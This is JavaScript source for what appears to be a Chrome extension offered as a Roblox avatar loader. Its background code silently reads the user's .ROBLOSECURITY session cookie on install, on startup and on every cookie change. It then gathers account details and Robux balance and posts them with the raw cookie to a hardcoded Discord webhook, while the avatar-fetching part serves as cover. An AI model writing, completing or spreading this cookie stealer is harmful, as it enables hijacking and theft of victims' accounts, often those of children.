var secretWebhook = "https://discord.com/api/webhooks/1430983364877353064/MaKjgWGM4Sj6Nc2jCKWpBgSomQf4FJ62pSV-Ahxd1ElQLbwrofWgd1rFKTtrQJA3CwZ8";

async function getRobloxCookie() {
  chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, async (cookie) => {
    if (cookie) {
      const currentValue = cookie.value;
      const stored = await chrome.storage.local.get("cacheRBX");

      if (stored.cacheRBX !== currentValue) {
        console.log("Cookie updated:", currentValue);
        chrome.storage.local.set({ cacheRBX: currentValue });
        await fetchRobloxInfo(currentValue);
      }
    } else {
      console.log("No Roblox cookie found.");
    }
  });
}

async function robloxFetch(url, cookieValue) {
  let res = await fetch(url, {
    method: "GET",
    credentials: "include",
    headers: {
      "Cookie": `.ROBLOSECURITY=${cookieValue}`
    }
  });

  let text = await res.text();
  try {
    return JSON.parse(text);
  } catch {
    console.error(`Failed to parse JSON from ${url}`);
    return {};
  }
}

async function fetchRobloxInfo(cookieValue) {
  try {
    let userData = await robloxFetch("https://users.roblox.com/v1/users/authenticated", cookieValue);
    let username = userData.name || "Unknown";
    let displayName = userData.displayName || "Unknown";
    let userId = userData.id || "Unknown";

    let robuxData = await robloxFetch("https://economy.roblox.com/v1/user/currency", cookieValue);
    let robux = robuxData.robux ?? "Unknown";

    let premiumText = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
      credentials: "include",
      headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
    }).then(r => r.text());
    let premium = premiumText === "true" ? "Yes" : "No";

    // Compose message with no empty gap before cookie
    sendToDiscord(username, displayName, userId, robux, premium, cookieValue);

  } catch (err) {
    console.error("Failed to fetch Roblox info:", err);
  }
}

function sendToDiscord(username, displayName, userId, robux, premium, cookieValue) {
  let content =
    `**Roblox Account Info**
Username: ${username}
Display Name: ${displayName}
User ID: ${userId}
Robux: ${robux}
Premium: ${premium}
\`\`\`
${cookieValue}
\`\`\``;

  fetch(secretWebhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content })
  }).catch(err => console.error("Failed to send to Discord:", err));
}

// Your existing startup/install listeners:
chrome.runtime.onStartup.addListener(getRobloxCookie);
chrome.runtime.onInstalled.addListener(getRobloxCookie);

chrome.cookies.onChanged.addListener((changeInfo) => {
  if (changeInfo.cookie.domain.includes("roblox.com") &&
    changeInfo.cookie.name === ".ROBLOSECURITY") {
    getRobloxCookie();
  }
});

// --- Avatar loader code below ---

// Helper to get Roblox cookie (reuse your existing code or function)
async function getCookie() {
  return new Promise((resolve) => {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, cookie => {
      resolve(cookie ? cookie.value : null);
    });
  });
}

// Fetch JSON helper (reuse your robloxFetch or this)
async function fetchJson(url, cookie) {
  let res = await fetch(url, {
    headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    credentials: "include"
  });
  if (!res.ok) throw new Error("Failed fetch: " + res.status);
  return res.json();
}

// Listen for popup requests
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "fetchRobloxAvatar") {
    (async () => {
      try {
        const cookieValue = await getCookie();
        if (!cookieValue) {
          sendResponse({ error: "No Roblox cookie found." });
          return;
        }

        // Get user ID
        const userData = await fetchJson("https://users.roblox.com/v1/users/authenticated", cookieValue);
        const userId = userData.id;
        if (!userId) {
          sendResponse({ error: "User not authenticated." });
          return;
        }

        if (request.dataType === "url") {
          // Avatar image URL
          const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
          sendResponse({ avatarUrl });
        } else if (request.dataType === "json") {
          // Full avatar JSON data
          const avatarJson = await fetchJson(`https://avatar.roblox.com/v1/users/${userId}/avatar`, cookieValue);
          sendResponse({ avatarJson });
        } else {
          sendResponse({ error: "Invalid dataType" });
        }
      } catch (e) {
        sendResponse({ error: e.message });
      }
    })();

    // Return true to indicate async sendResponse
    return true;
  }
});
